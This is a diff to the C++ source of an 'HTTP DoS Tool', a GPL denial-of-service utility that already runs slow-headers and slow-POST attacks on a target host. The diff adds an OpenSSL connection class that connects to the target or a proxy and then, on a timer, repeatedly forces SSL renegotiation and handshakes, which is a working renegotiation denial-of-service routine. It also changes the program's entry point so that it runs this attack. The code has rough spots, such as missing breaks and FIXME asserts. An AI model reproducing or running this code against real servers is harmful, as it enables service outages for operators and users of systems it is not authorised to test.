@@ -1,4 +1,4 @@
-// Copyright (c) 2010, PROACTIVE RISK - http://www.proactiverisk.com
+// Copyright (c) 2010-2014, PROACTIVE RISK - http://www.proactiverisk.com
 //
 // This file is part of HTTP DoS Tool.
 //
@@ -7,9 +7,10 @@
 // Software Foundation, either version 3 of the License, or (at your option) any
 // later version.
 //
-// Foobar is distributed in the hope that it will be useful, but WITHOUT ANY
-// WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
-// A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
+// HTTP Dos Tool is distributed in the hope that it will be useful, but WITHOUT
+// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
+// FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
+// more details.
 //
 // You should have received a copy of the GNU General Public License along with
 // HTTP DoS Tool.  If not, see <http://www.gnu.org/licenses/>.
@@ -31,6 +32,9 @@
 #include <getopt.h>
 #include <stdint.h>
 #include <unistd.h>
+#include <assert.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 #include <cstdlib>
 #include <cstring>
@@ -79,7 +83,7 @@ void throw_socket_error(const std::string& str)
 #ifdef PLAT_LINUX
   error = errno;
   
-  oss << "() failed: error " << error;
+  oss << " failed: error " << error;
 
   char errbuf[2048];
   if (strerror_r(error, errbuf, sizeof(errbuf)) == 0) {
@@ -87,9 +91,43 @@ void throw_socket_error(const std::string& str)
   }
 #else
   error = WSAGetLastError();
-  oss << "() failed: error " << error;
+  oss << " failed: error " << error;
 #endif
 
+  throw std::runtime_error(oss.str());
+}
+
+void throw_ssl_error(const std::string& str)
+{
+  std::ostringstream oss;
+  oss << str << ": ";
+
+  while (true) {
+    unsigned long error_code = ERR_get_error();
+    if (error_code == 0)
+      break;
+
+    char err_buf[1024];
+    ERR_error_string_n(error_code, err_buf, sizeof(err_buf));
+
+    oss << err_buf << " ";
+  }
+
+  throw std::runtime_error(oss.str());
+}
+
+void throw_ssl_conn_error(SSL *ssl, int ret)
+{
+  int ssl_err = SSL_get_error(ssl, ret);
+
+  if (ssl_err == SSL_ERROR_SSL)
+    throw_ssl_error("SSL connection error");
+  if (ssl_err == SSL_ERROR_SYSCALL) {
+    throw_socket_error("SSL connection error");
+  }
+
+  std::ostringstream oss;
+  oss << "SSL connection error: " << ssl_err;
   throw std::runtime_error(oss.str());
 }
 
@@ -302,7 +340,17 @@ private:
 
 };
 
-class SlowHeadersHttpConnection {
+struct BufferEventHandler {
+  static void buf_event_read_cb(struct bufferevent* be, void* arg);
+  static void buf_event_write_cb(struct bufferevent* be, void* arg);
+  static void buf_event_event_cb(struct bufferevent* be, short what, void* arg);
+
+  virtual void event_read() = 0;
+  virtual void event_write() = 0;
+  virtual void event_event(int what) = 0;
+};
+
+class SlowHeadersHttpConnection : public BufferEventHandler {
 public:
   SlowHeadersHttpConnection(Controller&, bool log);
 
@@ -319,21 +367,64 @@ private:
   bool                          logging_;
   bool                          connected_;
 
-  static void buf_event_read_cb(struct bufferevent* be, void* arg);
-  static void buf_event_write_cb(struct bufferevent* be, void* arg);
-  static void buf_event_event_cb(struct bufferevent* be, short what, void* arg);
   static void send_next_header_part_cb(int, short, void*);
   static void send_next_post_part_cb(int, short, void*);
 
-  void event_read();
-  void event_write();
-  void event_event(int what);
+  virtual void event_read();
+  virtual void event_write();
+  virtual void event_event(int what);
   void send_next_header_part();
   void send_next_post_part();
   void schedule_next_send();
   void buf_write(const char* data, size_t size);
   void log_lines(const char* header, const char* data, int size);
 };
+
+class SslConnection {
+public:
+  SslConnection(Controller&, bool log);
+
+  static void init_once();
+
+private:
+  Controller&                   controller_;
+  int                           socket_;
+  bool                          logging_;
+  SSL*                          ssl_;
+  struct event*                 event_;
+  enum {
+    STATE_TCP_CONNECTING,
+    STATE_SSL_CONNECTING,
+    STATE_SSL_CONNECTED
+  }                             state_;
+
+  static SSL_CTX*               ctx_;
+
+  static void event_cb(evutil_socket_t, short, void *);
+  static void timer_cb(evutil_socket_t sock, short events, void *arg);
+  void event_read();
+  void event_write();
+  void event_event(evutil_socket_t sock, short events);
+  void timer_event();
+  void tcp_connected();
+  void ssl_connected();
+  void ssl_connect();
+};
+
+void BufferEventHandler::buf_event_read_cb(struct bufferevent* be, void* arg)
+{
+  reinterpret_cast<BufferEventHandler*>(arg)->event_read();
+}
+
+void BufferEventHandler::buf_event_write_cb(struct bufferevent* be, void* arg)
+{
+  reinterpret_cast<BufferEventHandler*>(arg)->event_write();
+}
+
+void BufferEventHandler::buf_event_event_cb(struct bufferevent* be, short what, void* arg)
+{
+  reinterpret_cast<BufferEventHandler*>(arg)->event_event(what);
+}
 
 Controller::Controller(const Options& opts)
   : opts_(opts),
@@ -466,9 +557,9 @@ SlowHeadersHttpConnection::SlowHeadersHttpConnection(Controller& shc, bool log)
   }
 
   bufferevent_setcb(buf_.get(),
-      &SlowHeadersHttpConnection::buf_event_read_cb,
-      &SlowHeadersHttpConnection::buf_event_write_cb,
-      &SlowHeadersHttpConnection::buf_event_event_cb,
+      &BufferEventHandler::buf_event_read_cb,
+      &BufferEventHandler::buf_event_write_cb,
+      &BufferEventHandler::buf_event_event_cb,
       this);
   bufferevent_enable(buf_.get(), EV_READ|EV_WRITE);
 
@@ -495,21 +586,6 @@ SlowHeadersHttpConnection::SlowHeadersHttpConnection(Controller& shc, bool log)
     throw std::runtime_error("Got error in bufferevent_socket_new(): should "
         "not fail here.");
   }
-}
-
-void SlowHeadersHttpConnection::buf_event_read_cb(struct bufferevent* be, void* arg)
-{
-  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_read();
-}
-
-void SlowHeadersHttpConnection::buf_event_write_cb(struct bufferevent* be, void* arg)
-{
-  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_write();
-}
-
-void SlowHeadersHttpConnection::buf_event_event_cb(struct bufferevent* be, short what, void* arg)
-{
-  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_event(what);
 }
 
 void SlowHeadersHttpConnection::send_next_header_part_cb(int fd, short what, void* arg)
@@ -728,6 +804,198 @@ void SlowHeadersHttpConnection::send_next_post_part()
 
 // -------------------------------------------------------------------------
 
+SSL_CTX *SslConnection::ctx_;
+  
+SslConnection::SslConnection(Controller& shc, bool log)
+  : controller_(shc), logging_(log), ssl_(NULL), event_(NULL),
+    state_(STATE_TCP_CONNECTING)
+{
+  socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (socket_ == -1) {
+    throw_socket_error("socket");
+  }
+
+  evutil_make_socket_nonblocking(socket_);
+
+  event_ = event_new(controller_.get_event_base(),
+                     socket_,
+                     EV_READ|EV_WRITE|EV_PERSIST,
+                     &SslConnection::event_cb,
+                     this);
+
+  if (event_add(event_, NULL) != 0) {
+    throw std::runtime_error("event_add failed");
+  }
+
+  const Options& opts = shc.get_options();
+  struct sockaddr_in addr;
+
+  addr.sin_family       = AF_INET;
+
+  if (opts.proxy_addr_) {
+    addr.sin_addr.s_addr  = opts.proxy_addr_;
+    addr.sin_port         = opts.proxy_port_;
+  } else {
+    addr.sin_addr.s_addr  = opts.host_addr_;
+    addr.sin_port         = opts.host_port_;
+  }
+
+  if (logging_) {
+    std::cout << "EVENT_CONNECTING: " << inet_ntoa(addr.sin_addr)
+      << ":" << ntohs(addr.sin_port) << std::endl;
+  }
+
+  state_ = STATE_TCP_CONNECTING;
+
+  int ret = ::connect(socket_, reinterpret_cast<struct sockaddr*>(&addr),
+      sizeof(addr));
+  if (ret == 0) {
+    state_ = STATE_SSL_CONNECTING;
+    ssl_connect();
+  } else {
+    if (errno == EINPROGRESS || errno == EAGAIN) {
+      // Expected, non-blocking isn't finished yet
+    } else {
+      throw_socket_error("connect");
+    }
+  }
+}
+
+void SslConnection::event_cb(evutil_socket_t sock, short events, void *arg)
+{
+  reinterpret_cast<SslConnection *>(arg)->event_event(sock, events);
+}
+
+void SslConnection::timer_cb(evutil_socket_t sock, short events, void *arg)
+{
+  reinterpret_cast<SslConnection *>(arg)->timer_event();
+}
+
+void SslConnection::init_once()
+{
+  SSL_load_error_strings();
+  SSL_library_init();
+
+  ctx_ = SSL_CTX_new(SSLv23_method());
+  if (!ctx_)
+    throw_ssl_error("SSL_CTX_new failed");
+
+#if 0
+  SSL_CTX_set_options(ctx_, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);
+  SSL_CTX_set_options(ctx_, SSL_OP_LEGACY_SERVER_CONNECT);
+
+  if (SSL_CTX_set_cipher_list(ctx_, "AES256-SHA:RC4-MD5") == 0)
+    throw_ssl_error("SSL_CTX_set_cipher_list failed");
+#endif
+}
+
+void SslConnection::event_read()
+{
+  switch (state_) {
+    case STATE_TCP_CONNECTING:
+      tcp_connected();
+      break;
+    case STATE_SSL_CONNECTING:
+      ssl_connect();
+    default:
+      assert(0);
+      break;
+  };
+}
+
+void SslConnection::event_write()
+{
+  switch (state_) {
+    case STATE_TCP_CONNECTING:
+      tcp_connected();
+      break;
+    case STATE_SSL_CONNECTING:
+      ssl_connect();
+    case STATE_SSL_CONNECTED:
+      std::cout << "ssl-connected: write" << std::endl;
+      break;
+    default:
+      assert(0);
+      break;
+  };
+}
+
+void SslConnection::event_event(evutil_socket_t sock, short events)
+{
+  if (events & EV_WRITE)
+    event_write();
+  if (events & EV_READ)
+    event_read();
+  if (events & ~(EV_WRITE|EV_READ))
+    assert(0); // FIXME
+}
+
+void SslConnection::timer_event()
+{
+  switch (state_) {
+  case STATE_SSL_CONNECTED:
+  {
+    std::cout << "SSL renegotiate" << std::endl;
+    int ret = SSL_renegotiate(ssl_);
+    if (ret != 1)
+      throw_ssl_error("SSL_renegotiate");
+    ret = SSL_do_handshake(ssl_);
+    if (ret != 1)
+      throw_ssl_error("SSL_handshake");
+    break;
+  }
+  default:
+    break;
+  }
+}
+
+void SslConnection::tcp_connected()
+{
+  state_ = STATE_SSL_CONNECTING;
+  std::cout << "EVENT_CONNECTED: !" << std::endl;
+  ssl_connect();
+}
+
+void SslConnection::ssl_connected()
+{
+  state_ = STATE_SSL_CONNECTED;
+  std::cout << "EVENT_SSL_CONNECTED: !" << std::endl;
+
+  struct event *timer = evtimer_new(controller_.get_event_base(),
+                                    &SslConnection::timer_cb,
+                                    this);
+  struct timeval tv = { 1, 0 };
+  evtimer_add(timer, &tv);
+}
+
+void SslConnection::ssl_connect()
+{
+  if (!ssl_) {
+    ssl_ = SSL_new(ctx_);
+    SSL_set_fd(ssl_, socket_);
+  }
+
+  int ret = SSL_connect(ssl_);
+  if (ret < 0) {
+    int ssl_err = SSL_get_error(ssl_, ret);
+
+    // Non-blocking, just need to keep polling connect
+    if (ssl_err == SSL_ERROR_WANT_READ ||
+        ssl_err == SSL_ERROR_WANT_WRITE)
+      return;
+
+    throw_ssl_conn_error(ssl_, ret);
+  } else if (ret == 1) {
+    ssl_connected();
+  } else if (ret == 0) {
+    throw_ssl_conn_error(ssl_, ret);
+  } else {
+    throw std::runtime_error("Invalid return code");
+  }
+}
+
+// -------------------------------------------------------------------------
+
 void version()
 {
   std::cout <<
@@ -922,8 +1190,12 @@ void run(const Options& opts)
 {
   Controller controller(opts);
 
-  controller.report();
-  controller.start_next_connection();
+  // controller.report();
+  // controller.start_next_connection();
+
+  SslConnection::init_once();
+
+  SslConnection ssl(controller, true);
 
   event_base_loop(controller.get_event_base(), 0);
 
